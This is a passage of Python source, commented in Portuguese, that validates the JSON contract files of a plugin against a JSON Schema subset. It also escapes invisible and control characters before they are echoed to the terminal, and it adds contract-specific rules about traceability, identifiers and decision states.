    "maximum": ((int, float), "número"),
    "pattern": ((str,), "texto"),
}

# `const` aceita qualquer valor JSON, então não tem forma a conferir. As anotações
# não são regra: descrevem o arquivo de contrato e são aceitas sem efeito.
OPERADORES_SEM_FORMA = {"const", "default"}
FORMA_DAS_ANOTACOES = {
    "$schema": ((str,), "texto"), "$id": ((str,), "texto"), "$comment": ((str,), "texto"),
    "title": ((str,), "texto"), "description": ((str,), "texto"),
    "examples": ((list,), "lista de exemplos"),
}
OPERADORES_CONHECIDOS = (set(FORMA_DOS_OPERADORES) | OPERADORES_SEM_FORMA
                         | set(FORMA_DAS_ANOTACOES))

# Documentos e definições do temcomo são rasos (a spec §5 não passa de 4 níveis).
# O limite existe para que documento fundo demais vire erro acionável em vez de
# estouro de pilha — a promessa da função é sempre devolver lista.
LIMITE_DE_PROFUNDIDADE = 60

# Categorias que somem na tela: controles C0/C1, formatação invisível (bidi, ZWSP),
# separadores de linha e parágrafo, e espaços que não são o espaço comum. A régua é a
# categoria Unicode — enumerar codepoints é o que deixa a próxima brecha aberta.
CATEGORIAS_INVISIVEIS_NO_ECO = ("Cc", "Cf", "Zl", "Zp", "Zs")

def neutralizar_para_eco(texto: str) -> str:
    """Dado citado ao usuário nunca comanda o terminal de quem lê.

    Sem isto, um `tarefa_id` com ESC pinta a saída de vermelho, um U+202E inverte a
    frase e um LF forja uma linha inteira de erro que o motor nunca escreveu. Vira tudo
    texto visível. O espaço comum é a única exceção: escapá-lo tornaria toda mensagem
    ilegível, e ele não esconde nem comanda nada.

    Ponto ÚNICO de neutralização: todo eco passa por aqui, via `citar` ou `_resumo`."""
    def escapavel(c: str) -> bool:
        if c == " ":
            return False
        return (0xD800 <= ord(c) <= 0xDFFF
                or unicodedata.category(c) in CATEGORIAS_INVISIVEIS_NO_ECO)

    return "".join(f"\\u{ord(c):04x}" if escapavel(c) else c for c in texto)

DADOS_QUE_PRECISAM_DE_CITACAO = ("caminho", "arquivo", "alvo", "destino", "pasta",
                                 "ancestral", "nome", "nomes", "raiz", "objetivo")
NEUTRALIZADORES = ("citar", "_resumo", "_lista_resumida", "neutralizar_para_eco",
                   "motivo_do_sistema", "esc", "do_contrato")

def ecos_crus_no_motor(fonte: str = None) -> list:
    """Onde um dado entra numa mensagem sem passar pelo funil de neutralização.

    Por AST, não por texto: o gate anterior era regex sobre nomes de variável e caía com
    `{str(arquivo)}` ou qualquer apelido. Aqui o que conta é o que a expressão FAZ —
    se o valor interpolado não passou por um neutralizador conhecido, é eco cru."""
    if fonte is None:
        bruto = Path(__file__).read_text(encoding="utf-8")
        bruto = bruto[:bruto.index(chr(10) + "class Test")]   # só o motor, não os testes
    else:
        bruto = fonte
    problemas = []

    def neutralizada(no) -> bool:
        if isinstance(no, ast.Call) and isinstance(no.func, ast.Name):
            return no.func.id in NEUTRALIZADORES
        if isinstance(no, ast.Call):        # metodo: str.join etc. — olha os argumentos
            return all(neutralizada(a) for a in no.args) if no.args else False
        if isinstance(no, ast.JoinedStr):
            return all(neutralizada(p.value) for p in no.values
                       if isinstance(p, ast.FormattedValue))
        return False

    def nome_de_dado(no) -> str:
        for filho in ast.walk(no):
            if isinstance(filho, ast.Name) and filho.id in DADOS_QUE_PRECISAM_DE_CITACAO:
                return filho.id
            if isinstance(filho, ast.Attribute) and filho.attr in ("name", "stem"):
                return filho.attr
        return ""

    for no in ast.walk(ast.parse(bruto)):
        if not (isinstance(no, ast.Call) and isinstance(no.func, ast.Name)
                and no.func.id in ("fail", "print")):
            continue
        for argumento in no.args:
            if not isinstance(argumento, ast.JoinedStr):
                continue
            for parte in argumento.values:
                if not isinstance(parte, ast.FormattedValue):
                    continue
                origem = nome_de_dado(parte.value)
                if origem and not neutralizada(parte.value):
                    problemas.append(
                        f"linha {parte.value.lineno}: o dado '{origem}' entra na mensagem "
                        f"sem passar por citar()/_resumo()")
    return problemas

def citar(valor, limite: int = 120) -> str:
    """Um caminho, nome de arquivo ou texto qualquer, pronto para entrar numa mensagem.

    `_resumo` fala JSON (para valores de contrato); `citar` é para o que já é texto —
    caminhos e nomes de arquivo —, que antes iam crus para a tela."""
    texto = neutralizar_para_eco(str(valor))
    if len(texto) <= limite:
        return texto
    metade = max((limite - 20) // 2, 8)
    return f"{texto[:metade]}…{texto[-metade:]} ({len(texto)} caracteres)"

def _resumo(valor, limite: int = 120) -> str:
    """Representação curta de um valor, para caber numa mensagem legível. Corta pelo
    meio, preservando começo E fim: duas coisas que só diferem no fim continuam
    distinguíveis na mensagem."""
    try:
        # o artefato é JSON, então a mensagem fala JSON: true/false/null, não True/False/None
        texto = json.dumps(valor, ensure_ascii=False)
    except (TypeError, ValueError):
        try:
            texto = repr(valor)
        except RecursionError:
            return "<valor aninhado demais para exibir>"
    except RecursionError:
        return "<valor aninhado demais para exibir>"
    # Uma unidade substituta isolada não cabe em UTF-8. A validação a reprova, mas
    # outros erros do mesmo documento ainda podem resumir o valor; escape aqui evita
    # que a própria mensagem de erro vire `UnicodeEncodeError`.
    texto = neutralizar_para_eco(texto)
    if len(texto) <= limite:
        return texto
    metade = max((limite - 20) // 2, 8)
    return f"{texto[:metade]}…{texto[-metade:]} ({len(texto)} caracteres)"

def _lista_resumida(valores, limite_total: int = 220) -> str:
    """Junta valores para uma mensagem, com teto no conjunto — não só em cada item."""
    partes, total = [], 0
    for i, valor in enumerate(valores):
        texto = _resumo(valor, 40)
        if partes and total + len(texto) > limite_total:
            return f"{', '.join(partes)} … e mais {len(valores) - i} opção(ões)"
        partes.append(texto)
        total += len(texto) + 2
    return ", ".join(partes)

def _do_tipo(valor, nome_tipo: str) -> bool:
    """`True` é booleano, nunca 1: sem isso, `True` passaria por integer/number.
    `integer` segue o padrão JSON Schema — 1.0 é inteiro, 1.5 não."""
    if nome_tipo == "boolean":
        return isinstance(valor, bool)
    if isinstance(valor, bool):
        return False
    if not _finito(valor):
        return False   # NaN e infinito não são valor JSON de tipo nenhum
    if nome_tipo == "integer":
        if isinstance(valor, float):
            return valor.is_integer()   # descarta 1.5, infinito e "não é número"
        return isinstance(valor, int)
    return isinstance(valor, TIPOS_JSON[nome_tipo])

class _FundoDemais(Exception):
    """Comparação passou do limite de profundidade — vira erro acionável, não
    uma falsa divergência ('esperado' e 'recebido' idênticos na tela)."""

def _igual(a, b, profundidade: int = 0) -> bool:
    """Igualdade estrita de JSON, recursiva: `True` não é 1 nem dentro de lista ou
    objeto. Fundo demais para comparar levanta `_FundoDemais` (tratado pelo chamador)."""
    if profundidade > LIMITE_DE_PROFUNDIDADE:
        raise _FundoDemais()
    if isinstance(a, bool) != isinstance(b, bool):
        return False
    if isinstance(a, list) or isinstance(b, list):
        return (isinstance(a, list) and isinstance(b, list) and len(a) == len(b)
                and all(_igual(x, y, profundidade + 1) for x, y in zip(a, b)))
    if isinstance(a, dict) or isinstance(b, dict):
        return (isinstance(a, dict) and isinstance(b, dict) and set(a) == set(b)
                and all(_igual(a[k], b[k], profundidade + 1) for k in a))
    return a == b

def erros_de_valor_impossivel(dado, caminho: str = "$", profundidade: int = 0) -> list:
    """Varre o documento inteiro atrás de valores que não existem em JSON de verdade:
    NaN e infinito. O módulo `json` do Python os aceita como extensão, mas o
    `JSON.parse` do navegador recusa — e são os HTMLs do temcomo que leem esses
    arquivos. Vale para todo campo, inclusive os que a definição não descreve, senão
    o valor impossível entra pela porta de trás e ainda burla `minimum`/`maximum`
    (comparação com NaN é sempre falsa)."""
    if profundidade > LIMITE_DE_PROFUNDIDADE:
        return [f"{caminho}: documento aninhado demais (passa de "
                f"{LIMITE_DE_PROFUNDIDADE} níveis) — simplifique a estrutura"]
    if isinstance(dado, str):
        substituto = next((ord(c) for c in dado if 0xD800 <= ord(c) <= 0xDFFF), None)
        if substituto is not None:
            return [f"{caminho}: contém unidade substituta Unicode isolada "
                    f"(U+{substituto:04X}), que não pode ser gravada em UTF-8 — "
                    f"reescreva esse caractere"]
    if not _finito(dado):
        return [f"{caminho}: {nome_do_tipo(dado)} não é um valor aceito em JSON — "
                f"use um número comum"]
    erros = []
    if isinstance(dado, list):
        for i, item in enumerate(dado):
            erros += erros_de_valor_impossivel(item, f"{caminho}[{i}]", profundidade + 1)
    elif isinstance(dado, dict):
        for campo, valor in dado.items():
            substituto = (next((ord(c) for c in campo if 0xD800 <= ord(c) <= 0xDFFF), None)
                          if isinstance(campo, str) else None)
            if substituto is not None:
                erros.append(f"{caminho}: nome de campo contém unidade substituta Unicode "
                             f"isolada (U+{substituto:04X}), que não pode ser gravada em UTF-8")
                continue
            erros += erros_de_valor_impossivel(valor, f"{caminho}.{citar(campo, 60)}", profundidade + 1)
    return erros

# Erros do sistema de arquivos chegam com prosa em inglês ("Permission denied"). Os
# motivos comuns têm tradução própria; para o resto vale o padrão da decisão 15 — o
# texto original preservado, atrás de uma linha-rótulo em PT-BR.
ROTULO_SISTEMA = "Detalhe técnico no formato original do sistema:"
MOTIVOS_DO_SISTEMA = {
    errno.EACCES: "sem permissão para escrever aí",
    errno.EPERM: "o sistema não permite esta operação",
    errno.ENOSPC: "não há espaço livre no disco",
    errno.EROFS: "esse disco só aceita leitura",
    errno.ENOTDIR: "o caminho passa por algo que não é pasta",
    errno.EISDIR: "o caminho é uma pasta, e aqui era esperado um arquivo",
    errno.EEXIST: "já existe algo com esse nome",
    errno.ENOENT: "esse caminho não existe",
    errno.ENAMETOOLONG: "o caminho é comprido demais",
    errno.ELOOP: "há atalhos apontando em círculo no caminho",
    errno.EMFILE: "há arquivos demais abertos ao mesmo tempo",
    errno.ENFILE: "o sistema está com arquivos demais abertos",
    errno.EBUSY: "o arquivo está em uso",
    errno.EXDEV: "origem e destino estão em discos diferentes",
    errno.EDQUOT: "a cota de disco acabou",
}

def motivo_do_sistema(e: OSError) -> str:
    """Motivo em PT-BR para uma falha do sistema de arquivos."""
    conhecido = MOTIVOS_DO_SISTEMA.get(getattr(e, "errno", None))
    if conhecido:
        return conhecido
    detalhe = (getattr(e, "strerror", "") or "").strip()
    if detalhe:
        return f"o sistema recusou a operação.\n{ROTULO_SISTEMA}\n{detalhe}"
    return "o sistema recusou a operação"

def prosa_sem_detalhe_tecnico(texto: str) -> str:
    """Só a parte escrita por nós: corta no rótulo que anuncia texto original."""
    for rotulo in (ROTULO_SISTEMA, ROTULO_RASTRO):
        texto = texto.split(rotulo)[0]
    return texto

def escrever_texto(caminho, texto: str) -> None:
    """Escreve um arquivo traduzindo qualquer falha do sistema para PT-BR."""
    try:
        Path(caminho).write_text(texto, encoding="utf-8")
    except OSError as e:
        fail(f"não consegui gravar '{citar(caminho)}' — {motivo_do_sistema(e)}")

def _invalida(caminho: str, motivo: str) -> str:
    return f"{citar(caminho)}: definição do formato inválida — {motivo}"

def _sugestao(palavra, candidatos) -> str:
    """' (você quis dizer 'x'?)' quando há um candidato parecido — pega typo."""
    if not isinstance(palavra, str):
        return ""
    parecidos = difflib.get_close_matches(palavra, sorted(candidatos), n=1, cutoff=0.7)
    return f" (você quis dizer '{parecidos[0]}'?)" if parecidos else ""

def erros_de_definicao(schema, caminho: str = "$", profundidade: int = 0) -> list:
    """Metavalidação estrutural **completa**: percorre a definição inteira — inclusive
    ramos que o documento não visita —, uma vez, antes de olhar para o documento.
    Fail-closed: definição quebrada reprova com motivo acionável, nunca deixa passar."""
    if profundidade > LIMITE_DE_PROFUNDIDADE:
        return [_invalida(caminho, f"definição aninhada demais (passa de "
                                   f"{LIMITE_DE_PROFUNDIDADE} níveis)")]
    if not isinstance(schema, dict):
        return [_invalida(caminho, f"esperava objeto, veio {nome_do_tipo(schema)}")]

    erros = []
    # 1. operador que não existe (um typo desligaria a restrição em silêncio)
    for operador in schema:
        if operador not in OPERADORES_CONHECIDOS:
            citado = operador if isinstance(operador, str) else nome_do_tipo(operador)
            erros.append(_invalida(caminho, f"operador desconhecido '{citado}'"
                                            f"{_sugestao(operador, OPERADORES_CONHECIDOS)}"))

    # 2. forma de cada operador conhecido — e das anotações de cabeçalho, que não
    #    aplicam regra ao documento mas identificam o arquivo ($schema, $id…)
    for tabela in (FORMA_DOS_OPERADORES, FORMA_DAS_ANOTACOES):
        for operador, (tipos, descricao) in tabela.items():
            if operador not in schema:
                continue
            valor = schema[operador]
            aceito = (isinstance(valor, tipos)
                      and not (isinstance(valor, bool) and bool not in tipos))
            if not aceito:
                erros.append(_invalida(caminho, f"'{operador}' deveria ser {descricao}, "
                                                f"veio {nome_do_tipo(valor)}"))

    # 3. `type`: lista não vazia de nomes de tipo conhecidos
    tipos_declarados = schema.get("type")
    if isinstance(tipos_declarados, (str, list)):
        lista = tipos_declarados if isinstance(tipos_declarados, list) else [tipos_declarados]
        if not lista:
            erros.append(_invalida(caminho, "'type' não pode ser lista vazia"))
        for tipo in lista:
            if not isinstance(tipo, str):
                erros.append(_invalida(caminho, f"cada tipo deveria ser texto, "
                                                f"veio {nome_do_tipo(tipo)}"))
            elif tipo not in TIPOS_JSON:
                erros.append(_invalida(caminho, f"tipo desconhecido '{tipo}'"
                                                f"{_sugestao(tipo, TIPOS_JSON)}"))

    # 4. nomes de campo obrigatório
    if isinstance(schema.get("required"), list):
        for campo in schema["required"]:
            if not isinstance(campo, str):
                erros.append(_invalida(caminho, f"nome de campo obrigatório deveria ser "
                                                f"texto, veio {nome_do_tipo(campo)}"))

    # 5. padrão de texto compilável
    if isinstance(schema.get("pattern"), str):
        try:
            re.compile(schema["pattern"])
        except re.error:
            erros.append(_invalida(caminho, f"o padrão de texto '{schema['pattern']}' "
                                            f"está mal escrito"))

    # 6. invariantes de sentido: limite negativo, número que não é número, faixa
    #    invertida e lista de aceitos vazia viram restrição inerte ou impossível.
    for operador in ("minLength", "maxLength", "minItems", "maxItems"):
        valor = schema.get(operador)
        if isinstance(valor, int) and not isinstance(valor, bool) and valor < 0:
            erros.append(_invalida(caminho, f"'{operador}' não pode ser negativo (veio {valor})"))
    for operador in ("minimum", "maximum"):
        valor = schema.get(operador)
        if isinstance(valor, float) and not _finito(valor):
            erros.append(_invalida(caminho, f"'{operador}' precisa ser um número de verdade "
                                            f"(veio {valor})"))
    for menor, maior in (("minLength", "maxLength"), ("minItems", "maxItems"),
                         ("minimum", "maximum")):
        a, b = schema.get(menor), schema.get(maior)
        if (isinstance(a, (int, float)) and isinstance(b, (int, float))
                and not isinstance(a, bool) and not isinstance(b, bool)
                and _finito(a) and _finito(b) and a > b):
            erros.append(_invalida(caminho, f"faixa impossível: '{menor}' ({_resumo(a, 40)}) "
                                            f"é maior que '{maior}' ({_resumo(b, 40)})"))
    if isinstance(schema.get("enum"), list) and not schema["enum"]:
        erros.append(_invalida(caminho, "'enum' vazio não aceita valor nenhum"))

    # 7. desce para a definição inteira, independentemente do documento
    if isinstance(schema.get("properties"), dict):
        for campo, subdefinicao in schema["properties"].items():
            erros += erros_de_definicao(subdefinicao, f"{caminho}.{campo}", profundidade + 1)
    if "items" in schema and isinstance(schema["items"], dict):
        erros += erros_de_definicao(schema["items"], f"{caminho}[]", profundidade + 1)
    return erros

def validar_contra_schema(dado, schema, caminho: str = "$", profundidade: int = 0) -> list:
    """Valida `dado` contra um subset de JSON Schema e devolve a lista de erros
    no formato "caminho: motivo" (lista vazia = válido). Acumula todos os erros
    encontrados e nunca lança exceção — nem por dado inválido, nem por definição
    de formato quebrada, nem por documento fundo demais.

    A definição é metavalidada por inteiro (uma vez, no topo) antes de o documento
    ser olhado: erro de autoria no schema não espera um documento passar pelo ramo
    para aparecer."""
    problemas_da_definicao = erros_de_definicao(schema, caminho)
    if problemas_da_definicao:
        return problemas_da_definicao   # definição quebrada reprova fechado
    impossiveis = erros_de_valor_impossivel(dado, caminho, profundidade)
    if impossiveis:
        return impossiveis              # NaN/infinito reprovam antes de qualquer limite
    return _validar_documento(dado, schema, caminho, profundidade)

def _validar_documento(dado, schema: dict, caminho: str, profundidade: int) -> list:
    """Percorre o documento contra uma definição **já metavalidada**."""
    if profundidade > LIMITE_DE_PROFUNDIDADE:
        return [f"{caminho}: documento aninhado demais (passa de "
                f"{LIMITE_DE_PROFUNDIDADE} níveis) — simplifique a estrutura"]

    erros = []
    tipo_confere = True
    declarados = schema.get("type")
    if declarados is not None:
        tipos = [t for t in (declarados if isinstance(declarados, list) else [declarados])
                 if isinstance(t, str) and t in TIPOS_JSON]
        if tipos and not any(_do_tipo(dado, t) for t in tipos):
            esperado = " ou ".join(NOME_PT_DO_TIPO[t] for t in tipos)
            erros.append(f"{caminho}: esperava {esperado}, veio {nome_do_tipo(dado)}")
            tipo_confere = False

    # `const` e `enum` valem para qualquer tipo: seguem sendo checados mesmo com o
    # tipo errado, senão o leigo corrige o tipo e só então descobre o resto.
    fundo_demais = (f"{caminho}: valor aninhado demais para comparar (passa de "
                    f"{LIMITE_DE_PROFUNDIDADE} níveis) — simplifique a estrutura")
    if "const" in schema:
        try:
            if not _igual(dado, schema["const"]):
                erros.append(f"{caminho}: valor deve ser exatamente "
                             f"{_resumo(schema['const'])}, veio {_resumo(dado)}")
        except _FundoDemais:
            erros.append(fundo_demais)
    if "enum" in schema:
        try:
            if not any(_igual(dado, opcao) for opcao in schema["enum"]):
                erros.append(f"{caminho}: valor {_resumo(dado)} não está entre os aceitos "
                             f"({_lista_resumida(schema['enum'])})")
        except _FundoDemais:
            erros.append(fundo_demais)

    if not tipo_confere:
        return erros   # sem o tipo certo, o resto das checagens seria ruído

    if isinstance(dado, str) and not isinstance(dado, bool):
        if "minLength" in schema and len(dado) < schema["minLength"]:
            erros.append(f"{caminho}: precisa de pelo menos {schema['minLength']} "
                         f"caractere(s), veio com {len(dado)}")
        if "maxLength" in schema and len(dado) > schema["maxLength"]:
            erros.append(f"{caminho}: passa do limite de {schema['maxLength']} "
                         f"caractere(s), veio com {len(dado)}")
        # o padrão já foi compilado por erros_de_definicao(), então não estoura aqui
        if "pattern" in schema and not re.search(schema["pattern"], dado):
            erros.append(f"{caminho}: {_resumo(dado)} não segue o padrão de texto "
                         f"exigido ('{schema['pattern']}')")

    if isinstance(dado, (int, float)) and not isinstance(dado, bool):
        if "minimum" in schema and dado < schema["minimum"]:
            erros.append(f"{caminho}: precisa ser no mínimo {_resumo(schema['minimum'], 40)}, "
                         f"veio {_resumo(dado, 40)}")
        if "maximum" in schema and dado > schema["maximum"]:
            erros.append(f"{caminho}: precisa ser no máximo {_resumo(schema['maximum'], 40)}, "
                         f"veio {_resumo(dado, 40)}")

    if isinstance(dado, list):
        if "minItems" in schema and len(dado) < schema["minItems"]:
            erros.append(f"{caminho}: precisa de pelo menos {schema['minItems']} "
                         f"item(ns), veio com {len(dado)}")
        if "maxItems" in schema and len(dado) > schema["maxItems"]:
            erros.append(f"{caminho}: aceita no máximo {schema['maxItems']} "
                         f"item(ns), veio com {len(dado)}")
        if isinstance(schema.get("items"), dict):
            for i, item in enumerate(dado):
                erros += _validar_documento(item, schema["items"], f"{caminho}[{i}]",
                                            profundidade + 1)

    if isinstance(dado, dict):
        propriedades = schema.get("properties", {})
        for campo in schema.get("required", []):
            if campo not in dado:
                erros.append(f"{caminho}.{citar(campo, 60)}: campo obrigatório ausente")
        for campo, subschema in propriedades.items():
            if campo in dado:
                erros += _validar_documento(dado[campo], subschema, f"{caminho}.{citar(campo, 60)}",
                                            profundidade + 1)
        if schema.get("additionalProperties") is False:
            for campo in dado:
                if campo not in propriedades:
                    erros.append(f"{caminho}.{citar(campo, 60)}: campo não previsto neste contrato")

    return erros

# ————— contratos: registro das versões, carga e regras que o subset não expressa —————

PASTA_DO_MOTOR = Path(__file__).resolve().parent
RAIZ_DO_PLUGIN = PASTA_DO_MOTOR.parent
PASTA_DE_CONTRATOS = RAIZ_DO_PLUGIN / "contracts"
PASTA_DE_EXEMPLOS = PASTA_DE_CONTRATOS / "exemplos"

VERSOES_DE_CONTRATO = (
    "tarefa-v1", "objetivo-v1", "pesquisa-v1", "direcoes-v1",
    "decisao-direcoes-v1", "grill-rodada-v1", "grill-respostas-v1", "grill-consolidado-v1",
)
SCHEMAS = {versao: PASTA_DE_CONTRATOS / f"{versao}.schema.json"
           for versao in VERSOES_DE_CONTRATO}

# Envelope comum a todo contrato (spec §5): quem produziu, para qual tarefa e quando.
CAMPOS_DO_ENVELOPE = ("schema_version", "tarefa_id", "gerado_em", "produzido_por")
ENVELOPE_COMUM = {
    "type": "object",
    "required": list(CAMPOS_DO_ENVELOPE),
    "properties": {
        "schema_version": {"type": "string", "minLength": 1},
        "tarefa_id": {"type": "string", "minLength": 1},
        "gerado_em": {"type": "string", "pattern": r"^\d{4}-\d{2}-\d{2}"},
        "produzido_por": {
            "type": "object", "required": ["agente"],
            "properties": {"agente": {"type": "string", "minLength": 1},
                           "modelo": {"type": "string"},
                           "sessao_id": {"type": "string"},
                           "transcript_jsonl": {"type": "string"}},
        },
    },
}
# O export feito no navegador não tem sessão nem transcrição: quem preencheu foi gente.
AGENTE_USUARIO = "usuario"
# Critério de ranking que a spec §5 exige em toda comparação de direções.
CRITERIO_AGENTICO = "agentica"
# A spec §6 proíbe omitir rastreabilidade em silêncio; quem não consegue determinar, declara.
NAO_DETERMINAVEL = "nao-determinavel"

_CACHE_DE_SCHEMAS = {}

def carregar_schema(versao: str) -> dict:
    """Lê (uma vez) a definição de formato de uma versão de contrato."""
    if versao not in _CACHE_DE_SCHEMAS:
        caminho = SCHEMAS.get(versao)
        if caminho is None or not caminho.exists():
            fail(f"não encontrei a definição do contrato '{versao}' em '{PASTA_DE_CONTRATOS}'")
        _CACHE_DE_SCHEMAS[versao] = ler_json(caminho)
    return _CACHE_DE_SCHEMAS[versao]

def profundidade_textual(texto: str) -> int:
    """Maior nível de aninhamento do texto JSON, contado antes de desserializar —
    o decoder da stdlib é recursivo e estoura a pilha em documento muito fundo,
    então a conta precisa vir primeiro, olhando só os colchetes fora de texto."""
    nivel = maior = 0
    dentro_de_texto = escapado = False
    for caractere in texto:
        if dentro_de_texto:
            if escapado:
                escapado = False
            elif caractere == "\\":
                escapado = True
            elif caractere == '"':
                dentro_de_texto = False
            continue
        if caractere == '"':
            dentro_de_texto = True
        elif caractere in "[{":
            nivel += 1
            maior = max(maior, nivel)
        elif caractere in "]}":
            nivel -= 1
    return maior

def ler_json(caminho) -> dict:
    """Lê um arquivo JSON com mensagens de erro acionáveis em PT-BR."""
    caminho = Path(caminho)
    if not caminho.exists():
        fail(f"arquivo não encontrado: '{citar(caminho)}'")
    try:
        texto = caminho.read_text(encoding="utf-8")
    except UnicodeDecodeError:
        fail(f"'{citar(caminho)}' não está em UTF-8")
    except OSError:
        fail(f"não consegui ler o arquivo '{citar(caminho)}'")
    fundura = profundidade_textual(texto)
    if fundura > LIMITE_DE_PROFUNDIDADE:
        fail(f"'{citar(caminho)}' está aninhado demais ({fundura} níveis, o limite é "
             f"{LIMITE_DE_PROFUNDIDADE}) — simplifique a estrutura")
    try:
        return json.loads(texto)
    except json.JSONDecodeError as e:
        fail(f"'{citar(caminho)}' não é um JSON válido — a leitura quebrou na linha {e.lineno}, "
             f"coluna {e.colno}")
    except RecursionError:
        fail(f"'{citar(caminho)}' está aninhado demais para ser lido — simplifique a estrutura")
    except ValueError:
        # Do Python 3.11 em diante o próprio leitor recusa número com dígitos demais
        # (limite de 4300). É arquivo adulterado, não erro nosso: vira motivo, não rastro.
        fail(f"'{citar(caminho)}' tem número grande demais para ser lido com segurança — "
             f"use um número de tamanho normal")

# Categorias Unicode que não apresentam conteúdo ao leitor: formatação invisível
# (Cf, onde moram ZWSP, BOM, word joiner, soft hyphen…), controles (Cc, inclusive
# NUL) e separadores (Zs/Zl/Zp). A regra é por CATEGORIA e não por lista de
# codepoints de propósito: lista sempre deixa de fora o próximo invisível.
CATEGORIAS_SEM_CONTEUDO = frozenset(("Cf", "Cc", "Zs", "Zl", "Zp"))

def conteudo_visivel(texto: str) -> str:
    """O que sobra do texto depois de tirar tudo que não aparece para quem lê."""
    return "".join(caractere for caractere in unicodedata.normalize("NFC", texto)
                   if unicodedata.category(caractere) not in CATEGORIAS_SEM_CONTEUDO)

def _em_branco(valor) -> bool:
    """Campo "preenchido" só com invisível é omissão disfarçada: ocupa o campo,
    passa no `minLength` e não diz nada a ninguém."""
    return not isinstance(valor, str) or not conteudo_visivel(valor)

def _ids_unicos(itens, caminho: str, campo: str = "id") -> list:
    """Identificadores repetidos ou instáveis quebram a devolução, que casa por id."""
    vistos, erros = set(), []
    for i, item in enumerate(itens):
        if not isinstance(item, dict):
            continue
        chave = item.get(campo)
        if not isinstance(chave, str):
            continue        # tipo errado já foi acusado pela definição do formato
        # O parser HTML troca NUL pelo caractere de substituição e normaliza CR para LF.
        # Se um deles entrar no id, o valor do JSON deixa de casar com o atributo no DOM.
        if "\x00" in chave or "\r" in chave:
            erros.append(f"{caminho}[{i}].{citar(campo, 60)}: identificador contém caractere de controle "
                         f"que o navegador altera — use um identificador sem NUL nem retorno de carro")
        if chave in vistos:
            erros.append(f"{caminho}[{i}].{citar(campo, 60)}: identificador repetido "
                         f"({_resumo(chave, 40)}) — cada item precisa de um identificador só seu")
        vistos.add(chave)
    return erros

def erros_de_texto_em_branco(dado, schema, caminho: str = "$", profundidade: int = 0) -> list:
    """Todo campo de texto que a definição exige com conteúdo (`minLength` ≥ 1) precisa
    ter conteúdo de verdade. `minLength` do JSON Schema conta espaços — e o padrão foi
    mantido —, então a regra de não deixar passar campo só com espaço é do temcomo e
    mora aqui, valendo para o documento inteiro de uma vez."""
    if profundidade > LIMITE_DE_PROFUNDIDADE or not isinstance(schema, dict):
        return []
    erros = []
    if (isinstance(dado, str) and schema.get("minLength", 0) >= 1
            and dado and not conteudo_visivel(dado)):
        erros.append(f"{caminho}: não tem conteúdo visível — só espaço ou caractere "
                     f"invisível. Escreva o conteúdo de verdade ou tire o campo")
    if isinstance(dado, dict) and isinstance(schema.get("properties"), dict):
        for campo, subdefinicao in schema["properties"].items():
            if campo in dado:
                erros += erros_de_texto_em_branco(dado[campo], subdefinicao,
                                                  f"{caminho}.{citar(campo, 60)}", profundidade + 1)
    if isinstance(dado, list) and isinstance(schema.get("items"), dict):
        for i, item in enumerate(dado):
            erros += erros_de_texto_em_branco(item, schema["items"],
                                              f"{caminho}[{i}]", profundidade + 1)
    return erros

def regras_extras(dado) -> list:
    """Regras do contrato que o subset de JSON Schema não expressa: contagens,
    unicidade de identificador e dependência entre campos (spec §5 e §8)."""
    if not isinstance(dado, dict):
        return []
    erros = []
    versao = dado.get("schema_version")

    # Rastreabilidade (spec §6): agente sem sessão/transcrição é omissão silenciosa.
    produzido = dado.get("produzido_por")
    if isinstance(produzido, dict) and produzido.get("agente") != AGENTE_USUARIO:
        for campo in ("modelo", "sessao_id", "transcript_jsonl"):
            if _em_branco(produzido.get(campo)):
                erros.append(f"$.produzido_por.{campo}: obrigatório para trabalho de agente "
                             f"— se não houver como determinar, escreva '{NAO_DETERMINAVEL}'")

    if versao == "direcoes-v1" and isinstance(dado.get("criterios"), list):
        # spec §5: integração agêntica é critério de ranking sempre presente — e o
        # contrato precisa dizer isso, não só carregar o critério na lista.
        criterios = dado["criterios"]
        erros += _ids_unicos(criterios, "$.criterios")
        agenticos = [c for c in criterios
                     if isinstance(c, dict) and c.get("id") == CRITERIO_AGENTICO]
        if not agenticos:
            erros.append(f"$.criterios: falta o critério '{CRITERIO_AGENTICO}' (integração "
                         f"agêntica) — ele é obrigatório em toda comparação de direções")
        for criterio in agenticos:
            if criterio.get("sempre_presente") is not True:
                erros.append(f"$.criterios: o critério '{CRITERIO_AGENTICO}' precisa vir com "
                             f"'sempre_presente' verdadeiro — é invariante da spec, não uma "
                             f"escolha de cada relatório")

    if versao == "decisao-direcoes-v1":
        estado, escolhida = dado.get("estado"), dado.get("direcao_escolhida")
        if estado == "decidida" and _em_branco(escolhida):
            erros.append("$.direcao_escolhida: obrigatória quando a decisão está tomada "
                         "— sem ela não há escolha registrada, só a aparência de uma")
        if estado == "pendente" and escolhida is not None:
            erros.append(f"$.direcao_escolhida: precisa ficar vazia enquanto o estado é "
                         f"'pendente', veio {_resumo(escolhida, 40)}")

    if versao == "grill-consolidado-v1" and isinstance(dado.get("cobertura"), dict):
        cobertura = dado["cobertura"]
        pendentes = cobertura.get("duvidas_pendentes")
        lacunas = cobertura.get("lacunas") if isinstance(cobertura.get("lacunas"), list) else []
        if cobertura.get("veredito") == "SUFICIENTE":
            if pendentes != 0:
                erros.append(f"$.cobertura.duvidas_pendentes: a etapa 4 só fecha com zero "
                             f"dúvida pendente para declarar cobertura suficiente, "
                             f"veio {_resumo(pendentes, 40)}")
            if lacunas:
                erros.append(f"$.cobertura.lacunas: cobertura suficiente não convive com "
                             f"lacuna em aberto, vieram {len(lacunas)}")
        if cobertura.get("veredito") == "NOVA RODADA" and not lacunas:
            erros.append("$.cobertura.lacunas: pedir nova rodada exige nomear as lacunas "
                         "que faltam cobrir")

    if versao == "grill-respostas-v1" and isinstance(dado.get("respostas"), list):
        erros += _ids_unicos(dado["respostas"], "$.respostas", campo="pergunta_id")
        for i, resposta in enumerate(dado["respostas"]):
            if not isinstance(resposta, dict):
                continue
            estado, escolha = resposta.get("estado"), resposta.get("escolha_id")
            if estado == "aprovada" and _em_branco(escolha):
                erros.append(f"$.respostas[{i}].escolha_id: aprovar exige dizer qual opção "
                             f"foi escolhida")
            if estado == "pendente" and escolha is not None:
                erros.append(f"$.respostas[{i}].escolha_id: precisa ficar vazio enquanto a "
                             f"pergunta está pendente — o export distingue quem não respondeu "
                             f"de quem aceitou a recomendação")

    if versao == "direcoes-v1" and isinstance(dado.get("direcoes"), list):
        direcoes = dado["direcoes"]
        erros += _ids_unicos(direcoes, "$.direcoes")
        marcadas = [d for d in direcoes if isinstance(d, dict) and d.get("fora_da_caixa") is True]
        if len(marcadas) > 1:
